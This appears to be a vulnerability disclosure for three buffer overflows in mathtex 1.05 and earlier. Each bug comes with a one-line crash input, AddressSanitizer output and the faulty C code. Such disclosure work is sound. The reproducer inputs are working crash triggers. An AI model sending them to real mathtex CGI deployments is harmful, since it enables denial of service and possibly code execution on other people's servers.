# bug 1: stack overflow 

In the mathtex <=1.05, there is a stack overflow in function `mathtex`, leading to deny of service and command execution. This bug affects CGI and CLI mode.

## reproduce

``` bash
python -c "print((b'\\usepackage{' + b'a'*2048 + b'}')*9)" | xargs ./mathtex.cgi

=================================================================
==32795==ERROR: AddressSanitizer: global-buffer-overflow on address 0x557f887cc5a0 at pc 0x7f1d8fbb316d bp 0x7ffc18ed0ca0 sp 0x7ffc18ed0448
WRITE of size 256 at 0x557f887cc5a0 thread T0
    #0 0x7f1d8fbb316c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cc:431
    #1 0x557f8878a39f in getdirective /home/tianyang/fuzzing/mathtex/mathtex.c:3563
    #2 0x557f88778c4f in main /home/tianyang/fuzzing/mathtex/mathtex.c:1319
    #3 0x7f1d8f949082 in __libc_start_main ../csu/libc-start.c:308
    #4 0x557f88775b2d in _start (/home/tianyang/fuzzing/mathtex/mathtex.cgi+0x10b2d)

0x557f887cc5a0 is located 0 bytes to the right of global variable 'packages' defined in 'mathtex.c:428:13' (0x557f887cc120) of size 1152
  'packages' is ascii string 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
0x557f887cc5a0 is located 32 bytes to the left of global variable 'packargs' defined in 'mathtex.c:429:13' (0x557f887cc5c0) of size 1152
SUMMARY: AddressSanitizer: global-buffer-overflow ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy
Shadow bytes around the buggy address:
  0x0ab0710f1860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f1870: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f1880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f1890: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f18a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0ab0710f18b0: 00 00 00 00[f9]f9 f9 f9 00 00 00 00 00 00 00 00
  0x0ab0710f18c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f18d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f18e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f18f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab0710f1900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==32795==ABORTING
```

## cause

Function `mathtex` handles `usepackage` in the LaTex string.

``` C
// ...
static	char packages[9][128];		/* additional package names */
// ...
// ...
char  usepackage[1024] = "\000";	/* additional \usepackage{}'s */
// ...
if ( !iserror )				/* don't \usepackage for error */
 if ( npackages > 0 )			/* have additional packages */
  for ( ipackage=0; ipackage<npackages; ipackage++ ) { /*make \usepackage{}*/
    strcat(usepackage,"\\usepackage");	/* start with a directive */
    if ( !isempty(packargs[ipackage]) ) { /* have an optional arg */
      strcat(usepackage,"[");		/* begin optional argument */
      strcat(usepackage,packargs[ipackage]); /* add optional arg */
      strcat(usepackage,"]"); }		/* finish optional arg */
    strcat(usepackage,"{");		/* begin package name argument */
    strcat(usepackage,packages[ipackage]); /* add package name */
    strcat(usepackage,"}\n"); }		/* finish constructing directive */
```

The size of `usepackage` is 1024. The `mathtex` function use `strcat` function to fill `usepackage` from array packages, which have a max length of 9*128=1152.

# bug 2: global buffer overflow

In the mathtex <=1.05, there is a global buffer overflow of `exprbuffer`, caused by function `validate`, leading to deny of service and command execution. This bug affects CGI and CLI mode. 

# reproduce

``` bash
python -c "print('^'*1024)" | xargs ./mathtex.cgi

=================================================================
==6212==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55cfa6514748 at pc 0x55cfa64c7bb2 bp 0x7ffdb64ef220 sp 0x7ffdb64ef210
WRITE of size 1 at 0x55cfa6514748 thread T0
    #0 0x55cfa64c7bb1 in strchange /home/tianyang/fuzzing/mathtex/mathtex.c:4090
    #1 0x55cfa64ba1c4 in validate /home/tianyang/fuzzing/mathtex/mathtex.c:2276
    #2 0x55cfa64b204a in main /home/tianyang/fuzzing/mathtex/mathtex.c:1049
    #3 0x7f3d3fea3082 in __libc_start_main ../csu/libc-start.c:308
    #4 0x55cfa64b0b2d in _start (/home/tianyang/fuzzing/mathtex/mathtex.cgi+0x10b2d)

0x55cfa6514748 is located 8 bytes to the right of global variable 'exprbuffer' defined in 'mathtex.c:849:13' (0x55cfa650c740) of size 32768
0x55cfa6514748 is located 24 bytes to the left of global variable 'iserror' defined in 'mathtex.c:1560:12' (0x55cfa6514760) of size 4
SUMMARY: AddressSanitizer: global-buffer-overflow /home/tianyang/fuzzing/mathtex/mathtex.c:4090 in strchange
Shadow bytes around the buggy address:
  0x0aba74c9a890: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0aba74c9a8a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0aba74c9a8b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0aba74c9a8c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0aba74c9a8d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0aba74c9a8e0: 00 00 00 00 00 00 00 00 f9[f9]f9 f9 04 f9 f9 f9
  0x0aba74c9a8f0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x0aba74c9a900: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x0aba74c9a910: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x0aba74c9a920: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x0aba74c9a930: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==6212==ABORTING
```

## cause

In function `valid`, it will replace each character `^` in `exprbuffer` on bss, which have the length of 32768, to a long and legal string, with out cheking length of `exprbuffer`. So input too many character `^` will cause a global buffer overflow, leading to DoS and command execution. The backtrace is `main->validate->strchange`, which is different form CVE-2023-51890.

# bug 3

In the mathtex <=1.05, there is a global buffer overflow in function `advertisement` leading to deny of service and command execution, which affects both CGI and CLI mode.

## reproduce

``` bash
ython -c "print('\\\\\\\\version{}'.ljust(32767, 'a'))" | xargs ./mathtex.cgi 
=================================================================
==11954==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55c476c13740 at pc 0x7fa0223c516d bp 0x7ffc61eca830 sp 0x7ffc61ec9fd8
WRITE of size 32946 at 0x55c476c13740 thread T0
    #0 0x7fa0223c516c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cc:431
    #1 0x55c476bb995c in advertisement /home/tianyang/fuzzing/mathtex/mathtex.c:2339
    #2 0x55c476bb3aa4 in main /home/tianyang/fuzzing/mathtex/mathtex.c:1429
    #3 0x7fa02215b082 in __libc_start_main ../csu/libc-start.c:308
    #4 0x55c476bafb2d in _start (/home/tianyang/fuzzing/mathtex/mathtex.cgi+0x10b2d)

0x55c476c13740 is located 0 bytes to the right of global variable 'exprbuffer' defined in 'mathtex.c:849:13' (0x55c476c0b740) of size 32768
0x55c476c13740 is located 32 bytes to the left of global variable 'iserror' defined in 'mathtex.c:1560:12' (0x55c476c13760) of size 4
SUMMARY: AddressSanitizer: global-buffer-overflow ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy
Shadow bytes around the buggy address:
  0x0ab90ed7a690: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab90ed7a6a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab90ed7a6b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab90ed7a6c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ab90ed7a6d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0ab90ed7a6e0: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 04 f9 f9 f9
  0x0ab90ed7a6f0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x0ab90ed7a700: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x0ab90ed7a710: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x0ab90ed7a720: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x0ab90ed7a730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==11954==ABORTING
```

## cause

The function `advertisement` trys to `strcpy` from `adbuffer`, a stack buffer of 34815 length, to `exprbuffer`, a bss buffer of 32768 length.